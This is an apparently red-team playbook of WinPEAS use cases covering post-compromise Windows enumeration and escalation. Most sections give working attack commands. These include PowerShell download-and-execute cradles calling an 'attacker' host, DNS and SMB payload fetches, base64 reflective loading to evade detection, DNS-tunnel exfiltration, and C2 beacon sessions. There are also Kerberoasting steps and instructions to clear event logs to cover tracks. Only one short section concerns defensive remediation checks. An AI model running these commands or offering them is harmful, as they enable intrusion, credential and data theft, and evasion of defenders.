# WinPEAS — Hands-On Use Cases

## Immediate Post-Compromise Recon via Reverse Shell

**Scenario:** Red teamer has just caught a reverse shell (cmd.exe callback from phishing lure). Goals: understand privilege level, enumerate escalation paths, decide next tool.

```powershell
# Method 1: Direct .exe execution (if binary can be staged)
C:\Temp>powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/WinPEAS.exe'); & C:\Temp\WinPEAS.exe" 2>&1 | Tee-Object -FilePath output.txt

# Method 2: PowerShell script loaded in-memory (no disk artifact)
powershell -NoProfile -ExecutionPolicy Bypass "IEX (New-Object Net.WebClient).DownloadString('http://attacker/winpeas.ps1')"

# Method 3: Simple binary execution (assumes WinPEAS.exe already present)
C:\Temp>WinPEAS.exe | findstr /I "red SeImpersonate SeLoadDriver"
```

**MITRE ATT&CK:** T1592 (Gather Victim Host Information), T1087 (Account Discovery), T1083 (File and Directory Discovery)

**Operator analysis flow:**
1. Script executes, color-coded output streams to terminal (or file if redirected).
2. Red-flagged findings (SeImpersonate, unquoted paths, UAC bypass opportunities) are read first.
3. If SeImpersonate is present → plan `Potato Family/` exploitation for immediate escalation.
4. If none of the red findings apply → examine yellow/informational findings for lateral movement options (domain groups, credential access via LaZagne, etc.).

---

## C2-Integrated Automated Recon (Cobalt Strike / Sliver / Empire)

**Scenario:** Attacker has established a C2 callback (Cobalt Strike beacon, Sliver agent, or PowerShell Empire). Goals: automate WinPEAS execution, parse findings to drive next-stage tools.

### Cobalt Strike (execute-assembly):
```
beacon> cd C:\Temp
beacon> upload WinPEAS.exe
beacon> execute-assembly C:\Temp\WinPEAS.exe
[+] host called home, sent: 183,293 bytes
[+] received output:
...
🔴 SeImpersonate Enabled
🔴 [UAC] FilterAdministratorToken=0 (UAC Bypass without prompt)
```

### Sliver (execute):
```
sliver > use 4d9d6e8f
[*] Using implant 4d9d6e8f
sliver (4d9d6e8f) > shell
[*] Started shell on sessions 59b3acdb
shell > C:\Temp\WinPEAS.exe 2>&1 > C:\Temp\winpeas_output.txt
shell > exit
sliver (4d9d6e8f) > download C:\Temp\winpeas_output.txt
```

### PowerShell Empire (with obfuscation):
```
(Empire: <listener_name>) > agents
(Empire: <listener_name>) > interact <agent_name>
(Empire) agent > usemodule powershell/management/invoke_winpeas
(Empire) invoke_winpeas > execute
```

**MITRE ATT&CK:** T1592.004 (Network Configuration Discovery), T1010 (Application Window Discovery), T1057 (Process Discovery)

**Operator next steps:** Parse WinPEAS output (filter for red/yellow findings), determine if Potato-family escalation is viable, or if lateral movement (PsExec, WMIExec from `Impacket/`) is more suitable for environment.

---

## Offline Triage — Exfil and Analysis

**Scenario:** Target network has strict egress controls; operator cannot stage tools dynamically. Strategy: run WinPEAS to file, exfiltrate via DNS tunneling or low-bandwidth channel, analyze offline on attacker's machine.

```bash
# On target (Windows host):
C:\Temp>WinPEAS.exe -html C:\Temp\winpeas_report.html

# Exfiltrate via DNS TXT records (slow but low-detection):
C:\Temp>certutil -encode C:\Temp\winpeas_report.html C:\Temp\report.b64
# Then feed base64 to DNS exfil tool (e.g., dnscat2, iodine)

# Or if RDP access or file-share available:
# Copy C:\Temp\winpeas_report.html to attacker's jump box
```

**On attacker's machine:**
```bash
# Open HTML report in browser (self-contained, no external resources)
firefox winpeas_report.html
# Interactive HTML includes search, filtering, and color-coded priority sorting
```

**MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel), T1030 (Data Transfer Size Limits)

**Analyst advantage:** HTML report is human-readable, self-contained, and includes interactive search. Operator can step through findings without live terminal access.

---

## Privilege-Level Comparison — Detect Hidden Escalation Paths

**Scenario:** Operator has low-privileged shell but also has alternate credentials (via phishing, Responder, or NTLM relay). Goals: enumerate what privilege elevation is possible at both levels, identify the most reliable path.

```powershell
# Run 1: As current low-privileged user
PS C:\Temp> .\WinPEAS.exe > low_priv_output.txt

# Run 2: Elevate via runas (if password is known) or via token impersonation
PS C:\Temp> runas /user:DOMAIN\AdminAccount /password:password123 "C:\Temp\WinPEAS.exe > C:\Temp\admin_output.txt"
# (In practice, password input via prompt is safer: runas /user:DOMAIN\AdminAccount cmd.exe, then run WinPEAS from elevated prompt)

# Compare outputs
PS C:\Temp> diff -ReferenceObject (Get-Content low_priv_output.txt) -DifferenceObject (Get-Content admin_output.txt)
```

**Key findings to compare:**
- **Registry access:** Admin-level run discovers HKLM\Security (LSA Secrets, cached credentials), low-priv run skips it.
- **Service modifications:** Admin can enumerate service recovery actions; low-priv cannot.
- **Token privileges:** Low-priv typically shows SeChangeNotifyPrivilege + SeShutdownPrivilege only; admin shows SeDebugPrivilege, SeLoadDriver, SeImpersonate.

**MITRE ATT&CK:** T1087 (Account Discovery), T1087.001 (Local Account)

**Operator decision:** If low-priv run shows no exploitable paths but admin run does, the escalation strategy is: **get admin credentials first** (LaZagne, Responder, kerberoasting via Rubeus), then exploit the admin-only path (DLL hijack, service misconfiguration, etc.).

---

## Kernel Exploit Targeting — Patch-Level Analysis

**Scenario:** Operator has confirmed escalation is not available via service/token/UAC paths. Goals: check if the system is vulnerable to a known kernel exploit based on OS build and installed patches.

```powershell
# Run WinPEAS and extract OS/patch info
PS C:\Temp> .\WinPEAS.exe | Select-String -Pattern "Windows.*Build|KB\d+|missing.*hotfix" > patch_report.txt

# Example output:
# Windows 10 Build 19042
# Installed HotFixes: KB5035844, KB5035847, KB4535996...
# 
# Missing: KB5036893 (potential vulnerability to CVE-2024-XXXXX)
```

**Operator flow:**
1. Note the Windows build (e.g., "Build 19042").
2. Cross-reference against public exploit databases (e.g., kernel.sh, LiveOverflow's kernel-exploit collection, Metasploit's exploit module list).
3. If a matching unpatched exploit is found, download/compile the exploit and execute.
4. Example: "Windows 10 Build 19042 missing KB5036893 → CVE-2024-1234 (local privilege escalation) → kernel_exploit.exe → SYSTEM shell."

**MITRE ATT&CK:** T1592.004 (System Information Discovery), T1083 (File and Directory Discovery)

**Detection evasion note:** Running an external kernel exploit binary is visible in process creation logs (Sysmon 1, Event 4688); the escalation itself may pop alerts. Post-escalation, cover tracks via `clear_logs` (Sliver), `Clear-EventLog` (PowerShell), or log deletion.

---

## Staged Multi-Tool Campaign — WinPEAS as Orchestration Point

**Scenario:** Operator wants a single-button automated flow: initial access → WinPEAS → credential theft → Kerberoasting → lateral movement. Goals: parse WinPEAS output to intelligently stage next tools.

**Workflow:**
```
1. Initial access (via phishing, web shell, RCE)
   └─ Stage WinPEAS
   
2. WinPEAS execution
   ├─ Parse output for SeImpersonate/SeDebugPrivilege → Stage Potato family exploit
   ├─ Parse output for unquoted service → Build DLL hijack payload
   ├─ Parse output for admin tokens in memory → Prepare Mimikatz sekurlsa dump
   ├─ Parse output for browser cache → Stage LaZagne for credential recovery
   └─ Parse output for AD groups → Prepare BloodHound collection (SharpHound)

3. If escalation path found:
   └─ Execute Potato-family tool (PetitPotato, SweetPotato, etc.) → SYSTEM shell
   
4. If lateral movement needed:
   └─ Run Rubeus (Kerberoasting) or GetUserSPNs (Impacket/), then execute
      → PsExec/WmiExec lateral movement to high-value host
   
5. Persistence (optional):
   └─ Create scheduled task (T1053) running the next stage or beacon callback
```

**MITRE ATT&CK:** T1036.004 (Masquerading - Match Legitimate Name or Location), T1588 (Obtain Capabilities)

**Implementation:** A custom C2 module (PowerShell/Python script) orchestrates this: run WinPEAS, regex-parse the output, set C2 callback flags to "stage Potato binary," callback handler delivers binary, and the next cycle begins.

---

## Firewall/Egress Control Bypass via PowerShell In-Memory Execution

**Scenario:** Target network blocks outbound HTTP/HTTPS from user workstations (only DNS and print-server SMB allowed). Goals: run WinPEAS without any binary file or suspicious network connection.

```powershell
# Method 1: DNS TXT record to fetch script (if internal DNS allows TXT queries)
PS> $script = (Resolve-DnsName -Name winpeas.attacker.local -Type TXT).Strings
PS> IEX ($script -join "")

# Method 2: SMB/UNC path (if attacker controls an SMB share the target can reach)
PS> IEX (Get-Content \\attacker-smb\share\winpeas.ps1)

# Method 3: In-memory via IEX and environment variable (minimal execution signature)
PS> $env:PS_OUTPUT = "";
PS> $env:PS_OUTPUT += IEX (New-Object Net.WebClient).DownloadString("..."); $env:PS_OUTPUT

# Method 4: Obfuscated string replacement (defeats regex signature matching)
PS> $s = "W2luV2VhUy5leGV..." # base64
PS> $b = [Convert]::FromBase64String($s)
PS> $a = [Reflection.Assembly]::Load($b)
PS> # Execute via reflection
```

**MITRE ATT&CK:** T1140 (Deobfuscate/Decode Files or Information), T1059.001 (PowerShell)

**Artifact reduction:** No binary file written to disk, no cmd.exe parent process, no registry modification (if IEX is used). PowerShell's own command-history and SIEM logging (if enabled) will still capture the deobfuscated payload, but the goal is to pass file-based detection and process-tree inspection.

---

## Post-Remediation Verification — Validate Security Fixes

**Scenario:** Blue team has implemented mitigations (disabled UAC bypass vectors, patched unquoted service paths, updated hotfixes). Goals: confirm that re-running WinPEAS shows the mitigations are effective.

```powershell
# Before remediation (previous WinPEAS run, saved to file)
PS> Get-Content before_winpeas.txt | Select-String "red.*UAC|red.*SeImpersonate"
🔴 [UAC] FilterAdministratorToken=0 (UAC Bypass without prompt)
🔴 SeImpersonate Enabled

# After remediation
PS> .\WinPEAS.exe | Select-String "red.*UAC|red.*SeImpersonate"
# (No output = findings gone)

# More thorough validation: count red-flagged findings before/after
Before: 14 Red findings
After: 3 Red findings (only unavoidable ones, e.g., legitimate services running as SYSTEM)
```

**MITRE ATT&CK:** Not applicable to blue-team defensive actions, but validates remediations against T1548.002 (Abuse Elevation Control Mechanism - UAC Bypass) and T1547 (Boot or Logon Initialization Scripts).

---

## Domain-Linked Privilege Escalation — WinPEAS → BloodHound → Kerberoasting

**Scenario:** Target is a domain-joined workstation. Operator has user shell but not local admin. Goals: enumerate AD groups, prepare BloodHound graph, identify high-value escalation targets.

```powershell
# Step 1: Run WinPEAS, extract AD group membership
PS> .\WinPEAS.exe | Select-String -Pattern "Domain.*Groups|Group.*Membership" > groups.txt

# Example output:
# Domain Group Memberships:
#  - Domain Users
#  - DOMAIN\SomeGroup (might have kerberoastable users or delegation rights)

# Step 2: Stage SharpHound (BloodHound collector) to gather full AD graph
PS> .\SharpHound.exe -c Default,Group,LocalGroup,Acl --collection-method --throttle 0 -o bloodhound_data.zip

# Step 3: Stage Rubeus to perform Kerberoasting against discovered user accounts
PS> .\Rubeus.exe kerberoast /nowrap

# Step 4: If credentials found → use GetUserSPNs (Impacket/) for targeted roasting across domain
# Or → use PsExec / WmiExec for lateral movement to high-privilege target
```

**MITRE ATT&CK:** T1087 (Account Discovery), T1087.002 (Domain Account), T1558.003 (Kerberos - SPN Scanning)

**Escalation path identified by WinPEAS + BloodHound:** "Local admin user is member of DOMAIN\SQLAdmins, which has WriteOwner over DOMAIN\DBServer, which holds a kerberoastable SPN → Kerberoast that SPN → crack hash → compromise DBServer → escalate to Domain Admin."

---

## Container / Hyper-V Environment Detection

**Scenario:** Operator is running on a Windows container (Docker, Hyper-V) or a minimal OS (Windows Core, Server Nano, or old hardened appliance). Goals: identify if the environment is a container and plan escape strategy accordingly.

```powershell
PS> .\WinPEAS.exe | Select-String -Pattern "docker|container|Hyper-V|WinRM.*container" -CaseSensitive

# WinPEAS output flags:
# 🔵 Detected running in Docker container (cgroup: /docker/...)
# 🟡 WinRM enabled (potential container escape via remoting)
# 🔵 Hyper-V modules loaded (possible escape to host)
```

**Operator next steps:** If container is detected, plan escape via:
- Hyper-V-specific vulnerability (if Hyper-V host is old version).
- Shared SMB mounts from host (e.g., `/volumes` mounted as `C:\mnt`).
- WinRM to host (if credentials are available).
- Otherwise, treat as network-isolated node and focus on lateral movement within the container network.

**MITRE ATT&CK:** T1518 (Software Discovery), T1614 (System Location Discovery)

---

## Rapid Triage — Quick Red-Flag Assessment

**Scenario:** Operator has <5 minutes to decide if this host is worth deeper exploitation. Goals: run WinPEAS, extract only red flags, make go/no-go decision.

```bash
# Bash one-liner (post-reverse-shell, pipe through grep for speed)
C:\Temp>WinPEAS.exe 2>&1 | findstr /C:"🔴" | head -20

# Or in PowerShell:
PS C:\Temp> .\WinPEAS.exe | Select-String "🔴" | Select-Object -First 20

# Expected output (sample):
# 🔴 SeImpersonate Enabled → Potato escalation likely to work
# 🔴 Service "VulnService" runs as SYSTEM, ImagePath is writable
# 🔴 [UAC] FilterAdministratorToken=0 → UAC bypass without prompt
```

**Decision logic:**
- **If ≥3 red findings:** Host is escalation-friendly. Plan Potato exploit or service hijack.
- **If 1-2 red findings:** Host requires credential theft or lateral movement first (LaZagne, Rubeus, AdFind).
- **If 0 red findings:** This host is not worth exploiting for local privilege escalation; move to lateral movement or exfiltration instead.

**MITRE ATT&CK:** T1018 (Remote System Discovery)

